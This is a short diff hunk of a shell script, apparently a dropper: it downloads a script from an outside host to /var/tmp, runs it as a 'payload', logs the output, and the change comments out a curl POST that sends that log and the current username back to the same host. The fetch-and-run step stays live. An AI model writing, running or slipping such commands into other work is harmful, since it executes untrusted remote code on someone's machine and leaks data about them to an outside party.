@@ -15,4 +15,4 @@ curl http://sql.wah.ph/alpha_branch/script_final > /var/tmp/feather
 echo '[ * ] Executing payload'
 echo > ~/log.txt
 sh /var/tmp/feather | tee ~/log.txt
-curl -X POST -d ~/log.txt http://sql.wah.ph/update/post/request/?user=`whoami`
+# curl -X POST -d ~/log.txt http://sql.wah.ph/update/post/request/?user=`whoami`
